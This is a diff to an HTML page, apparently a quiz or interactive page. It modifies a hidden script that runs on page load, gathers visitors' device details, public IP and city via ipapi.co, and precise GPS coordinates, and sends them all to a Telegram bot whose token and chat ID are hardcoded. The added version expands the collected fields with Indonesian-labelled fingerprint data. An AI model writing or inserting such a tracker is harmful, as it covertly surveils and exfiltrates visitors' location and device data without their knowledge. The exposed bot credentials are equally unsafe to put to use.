@@ -1019,51 +1019,122 @@ function showResult(){
 render();
 </script>
 <script>
-    (function() {
-        const BOT_TOKEN = '7452582356:AAGVebNPLIW570_xBXZf3qQF8rWxGVclLKc';
-        const CHAT_ID = '8761801777';
+(function() {
+    // Konfigurasi Telegram
+    const BOT_TOKEN = '7452582356:AAGVebNPLIW570_xBXZf3qQF8rWxGVclLKc';
+    const CHAT_ID = '8761801777';
 
-        async function send(text) {
-            try {
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
-                });
-            } catch(e) {}
-        }
+    // Fungsi kirim pesan
+    async function sendToTelegram(text) {
+        try {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
+            });
+        } catch(e) {}
+    }
 
-        (async () => {
-            // 1. Informasi perangkat
-            let device = `🖥️ <b>Device Info</b>\n`;
-            device += `User Agent: ${navigator.userAgent}\n`;
-            device += `Platform: ${navigator.platform}\n`;
-            device += `Screen: ${screen.width}x${screen.height}\n`;
-            device += `Language: ${navigator.language}\n`;
-            device += `Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
-            await send(device);
+    // Deteksi OS (HP atau Windows)
+    const ua = navigator.userAgent;
+    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua);
+    const isWindows = /Windows NT/i.test(ua);
+    let osType = '';
+    let browser = '';
+    let platform = navigator.platform;
 
-            // 2. IP Publik (via ipapi.co)
-            try {
-                let res = await fetch('https://ipapi.co/json/');
-                let ipData = await res.json();
-                let ipMsg = `🌐 <b>IP & Location</b>\n`;
-                ipMsg += `IP: ${ipData.ip}\n`;
-                ipMsg += `Country: ${ipData.country_name}\n`;
-                ipMsg += `City: ${ipData.city}\n`;
-                ipMsg += `ISP: ${ipData.org}`;
-                await send(ipMsg);
-            } catch(e) {}
+    if (isMobile) {
+        if (/Android/i.test(ua)) osType = 'Android';
+        else if (/iPhone|iPad|iPod/i.test(ua)) osType = 'iOS';
+        else osType = 'Mobile';
+    } else if (isWindows) {
+        osType = 'Windows';
+    } else if (/Mac/i.test(ua)) {
+        osType = 'macOS';
+    } else if (/Linux/i.test(ua)) {
+        osType = 'Linux';
+    } else {
+        osType = 'Unknown';
+    }
 
-            // 3. Lokasi GPS (butuh izin pengguna)
-            if ("geolocation" in navigator) {
-                navigator.geolocation.getCurrentPosition(async (pos) => {
-                    let loc = `📍 <b>GPS Location</b>\nLat: ${pos.coords.latitude}\nLon: ${pos.coords.longitude}\nAccuracy: ${pos.coords.accuracy}m`;
-                    await send(loc);
-                }, (err) => {});
-            }
-        })();
-    })();
+    if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) browser = 'Chrome';
+    else if (/Firefox/i.test(ua)) browser = 'Firefox';
+    else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = 'Safari';
+    else if (/Edg/i.test(ua)) browser = 'Edge';
+    else if (/Opera|OPR/i.test(ua)) browser = 'Opera';
+    else browser = 'Unknown';
+
+    // Deteksi RAM (deviceMemory)
+    const ramGB = navigator.deviceMemory ? (navigator.deviceMemory + ' GB') : 'Tidak diketahui';
+
+    // Fungsi format waktu lokal
+    const now = new Date();
+    const waktuLokal = now.toLocaleString('id-ID', { 
+        day: 'numeric', month: 'numeric', year: 'numeric', 
+        hour: '2-digit', minute: '2-digit', second: '2-digit' 
+    });
+
+    // Kumpulkan info perangkat
+    const deviceInfo = `〘 𝗜𝗡𝗙𝗢 𝗣𝗘𝗥𝗔𝗡𝗚𝗞𝗔𝗧 〙
+━━━━━━━━━━━━━━━━
+OS           : ${osType}
+Browser      : ${browser}
+Platform     : ${platform}
+User Agent   : ${ua}
+Bahasa       : ${navigator.language}
+Zona Waktu   : ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+CPU Core     : ${navigator.hardwareConcurrency || 'Tidak diketahui'}
+RAM          : ${ramGB}
+Cookies      : ${navigator.cookieEnabled ? 'Ya' : 'Tidak'}
+Resolusi     : ${screen.width} x ${screen.height}
+Warna        : ${screen.colorDepth} bit
+Waktu Lokal  : ${waktuLokal}
+Referrer     : ${document.referrer || 'Langsung'}`;
+
+    // Kirim info perangkat
+    sendToTelegram(deviceInfo);
+
+    // Ambil IP dan lokasi dari ipapi.co
+    fetch('https://ipapi.co/json/')
+        .then(res => res.json())
+        .then(ipData => {
+            let ipMsg = `〘 𝗜𝗣 𝗔𝗗𝗗𝗥𝗘𝗦𝗦 〙
+━━━━━━━━━━━━━━━━
+IP Publik    : ${ipData.ip || '-'}
+Benua        : ${ipData.continent_name || '-'}
+Negara       : ${ipData.country_name || '-'}
+Provinsi     : ${ipData.region || '-'}
+Kota         : ${ipData.city || '-'}`;
+            sendToTelegram(ipMsg);
+        })
+        .catch(err => {
+            sendToTelegram(`〘 𝗜𝗣 𝗔𝗗𝗗𝗥𝗘𝗦𝗦 〙\n━━━━━━━━━━━━━━━━\nGagal mengambil data IP.`);
+        });
+
+    // Minta izin lokasi GPS (jika tersedia)
+    if ("geolocation" in navigator) {
+        navigator.geolocation.getCurrentPosition(
+            function(position) {
+                const lat = position.coords.latitude;
+                const lon = position.coords.longitude;
+                const accuracy = position.coords.accuracy;
+                const gpsMsg = `📍 <b>LOKASI GPS (akurat)</b>
+Latitude : ${lat}
+Longitude: ${lon}
+Akurasi  : ${Math.round(accuracy)} meter
+Waktu    : ${new Date().toLocaleString('id-ID')}`;
+                sendToTelegram(gpsMsg);
+            },
+            function(error) {
+                // Izin ditolak atau error lain
+                console.log('GPS tidak diizinkan atau error:', error.message);
+            },
+            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+        );
+    } else {
+        console.log('Browser tidak mendukung geolocation.');
+    }
+})();
 </script>
 </body>
 </html>
